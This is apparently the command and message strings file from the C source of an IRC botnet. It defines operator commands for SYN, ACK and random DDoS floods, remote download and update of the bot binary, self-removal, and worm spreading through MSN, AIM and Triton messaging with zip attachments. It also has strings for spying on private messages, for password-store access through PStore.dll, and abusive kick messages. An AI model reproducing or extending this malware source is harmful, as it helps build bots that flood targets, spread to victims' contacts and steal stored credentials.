#ifndef NO_DDOS
const char cmd_ddos_syn[]		= "ddos.syn";
const char cmd_ddos_ack[]		= "ddos.ack";
const char cmd_ddos_random[]	= "ddos.random";
#endif



#ifndef NO_DOWNLOAD
const char get_mnd1[]		= "r.getfile";
const char get_mnd2[]		= "r.new";
const char get_upd1[]		= "r.update";
const char get_upd2[]		= "r.upd4te";
#endif

const char get_auth1[]		= "login";
const char get_auth2[]		= "l";

const char cmd_threads_1[]		= "threads";
const char cmd_threads_2[]		= "t";
const char cmd_threads_sub[]	= "sub";
const char cmd_threads_kill_1[]	= "kill";
const char cmd_threads_kill_2[]	= "k";

const char cmd_logout_1[]		= "logout";
const char cmd_logout_2[]		= "lo";

//const char cmd_who[]			= "who";

const char cmd_remove_1[]		= "gone";
const char cmd_remove_2[]		= "rmzerm3b1tch";

//Fake commands, for people like lynx.
const char cmd_fake_remove[]    = "rm";
const char cmd_fakedownload[]   = "download";
const char cmd_fakeupdate[]     = "update";

/*const char cmd_imspread_1[]	= "welcome";
const char cmd_imspread_2[]	= "hello";
const char cmd_imspread_3[]	= "stop";
const char cmd_imspread_4[] = "asdf";*/
const char cmd_imspread_1[]	= "msn.msg";
const char cmd_imspread_2[]	= "msn.stop";
const char cmd_aimspread_1[] = "aim.msg";
const char cmd_aimspread_2[] = "aim.stop";
const char cmd_timspread_1[] = "triton.msg";
const char cmd_timspread_2[] = "triton.stop";


char str_auth_good[]	= "%s Welcome.";
char str_auth_full[]	= "%s Fail.";
char str_spy_privmsg[]	= "%s Spy: %s!%s@%s (PM: \"%s\")";
char str_auth_bad[]		= "%s Fail by: %s!%s@%s (Pass Tried: %s)";

char str_logout[]		= "%s %s out.";
char str_sl_logout[]	= "%s <%i> out.";
char str_sl_no_logout[]	= "%s No user at: <%i>";
char str_sl_in_logout[]	= "%s Invalid slot: <%i>";

char str_thread_stop[]	= "%s Kill: <%d> threads";
char str_thread_ac[]	= "%s No threads";
char str_thread_kill[]	= "%s Killed thread: <%s>";
char str_thread_fkill[]	= "%s Failed kt: <%s>";
char str_thread_alr[]	= "%s %s already running: <%d>.";
char str_thread_fail[]	= "%s Fail start %s, err: <%d>.";

char str_status[]		= "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";

char str_installed[]	= "%s Bot installed on: %s.";

char str_kick_msg[]		= "Go fuck yourself %s.";
char str_msn_spread[]	= "MSN// Message & Zipfile sent to: %d contacts.";
char str_msn_msg[]		= "MSN// Message sent to: %d Contacts.";
char str_msn_stat[] = "MSN// Sent Stats - Messages: %d :: Files: %d :: Message & Files: %d.";


char str_auth_ali[]		= "%s logged in.";
char str_quit_rem[]		= "Removed by: %s!%s@%s";
char str_quit_upd[]		= "gettin new bin .";
char str_noadvapi[]		= "%s Advapi.dll Failed";
char str_nopstore[]		= "%s PStore.dll Failed.";


char str_main_thread[]	= "%s Naim thd.";
char str_rup_thread[]	= "%s RuC.";
//char str_asecure_thread[]= "%s Asec.";

char str_bad_format[]	= "%s mis param.";

char str_exip_resolve[] = "cant dns";

char str_spread_try[] = "Attempting To run MSN Spread";
